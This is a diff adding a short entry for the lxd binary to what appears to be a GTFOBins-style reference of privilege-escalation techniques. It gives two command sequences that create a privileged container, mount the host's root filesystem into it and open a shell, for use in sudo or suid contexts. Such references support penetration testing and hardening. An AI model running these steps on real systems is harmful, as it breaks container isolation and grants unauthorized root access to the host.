@@ -1,0 +1,36 @@
+---
+type: gtfobin
+name: lxd
+platform: Unix
+functions: [shell]
+tags: [gtfobin, unix, lotl]
+---
+
+# lxd
+
+## shell
+
+```bash
+lxc init ubuntu:16.04 x -c security.privileged=true
+lxc config device add x x disk source=/ path=/mnt/ recursive=true
+lxc start x
+lxc exec x /bin/sh
+```
+_The image (e.g., `ubuntu:16.04`) must be present already, otherwise it will be downloaded._
+**Contexts:** sudo, suid
+
+```bash
+lxc image import ./alpine*.tar.gz --alias x
+lxc init x x -c security.privileged=true
+lxc config device add x x disk source=/ path=/mnt/ recursive=true
+lxc start x
+lxc exec x /bin/sh
+```
+_This requires steps to be run offline, then the resulting image must be uploaded to target. Build the local image with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder):
+
+```
+git clone https://github.com/saghul/lxd-alpine-builder
+cd lxd-alpine-builder
+sudo ./build-alpine -a i686
+```_
+**Contexts:** sudo, suid
